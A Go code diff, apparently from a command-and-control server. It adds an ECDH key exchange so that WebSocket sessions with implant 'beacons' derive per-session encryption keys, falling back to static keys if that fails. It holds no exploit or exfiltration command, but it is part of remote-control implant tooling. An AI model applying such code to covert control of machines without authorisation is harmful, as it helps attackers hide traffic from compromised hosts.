@@ -4,6 +4,7 @@ import (
 	k "BackendTemplate/pkg/connection/kcp"
 	"BackendTemplate/pkg/connection/tcp"
 	"BackendTemplate/pkg/connection/websocket"
+	"BackendTemplate/pkg/encrypt"
 	"BackendTemplate/pkg/security"
 	"bufio"
 	"crypto/tls"
@@ -309,14 +310,40 @@ func dialForwardSession(listenerType, address string, masterKey, salt []byte) (*
 
 	case "ws_forward":
 		logx.Infof("🔗 [WS-FORWARD] 尝试连接WebSocket正向客户端: %s\n", address)
-		ws, _, err := gorillaws.DefaultDialer.Dial("ws://"+address+"/ws", nil)
+		// 会话前 ECDH 交换（与反向 ws 方向相反：这里 C2 是拨号方，
+		// 所以由 C2 发起 —— 拨号带客户端公钥，从升级响应头取 beacon 公钥派生）。
+		// withKeys 为假时没有盐可用，跳过交换，保持原有静态密钥行为。
+		kxHdr := http.Header{}
+		// 客户端侧 KeyExchange 在 implant module，本 module 不可见；
+		// X25519+HKDF 两端对称，故用 ServerKeyExchange 充当拨号方实现。
+		var kxSrv *encrypt.ServerKeyExchange
+		if withKeys {
+			if s, kerr := encrypt.NewServerKeyExchange(); kerr == nil {
+				kxSrv = s
+				kxHdr.Set(encrypt.KxHeaderName, s.HeaderValue())
+			}
+		}
+		ws, resp, err := gorillaws.DefaultDialer.Dial("ws://"+address+"/ws", kxHdr)
 		if err != nil {
 			return nil, fmt.Errorf("WebSocket连接失败: %v", err)
 		}
+		var derivedMK []byte
+		if kxSrv != nil && resp != nil {
+			if peerPub, perr := encrypt.ParsePeerPublicKey(resp.Header.Get(encrypt.KxHeaderName)); perr == nil {
+				if mk, derr := kxSrv.DeriveMasterKey(peerPub, salt); derr == nil {
+					derivedMK = mk
+				} else {
+					logx.Warnf("⚠️ [WS-FORWARD-KX] 派生失败，回落静态密钥: %v\n", derr)
+				}
+			}
+		}
 		run := func() {
-			if withKeys {
+			switch {
+			case len(derivedMK) > 0:
+				websocket.HandleWebSocketForWithDerivedKey(ws, masterKey, salt, derivedMK)
+			case withKeys:
 				websocket.HandleWebSocketForWithKeys(ws, masterKey, salt)
-			} else {
+			default:
 				websocket.HandleWebSocketFor(ws)
 			}
 		}
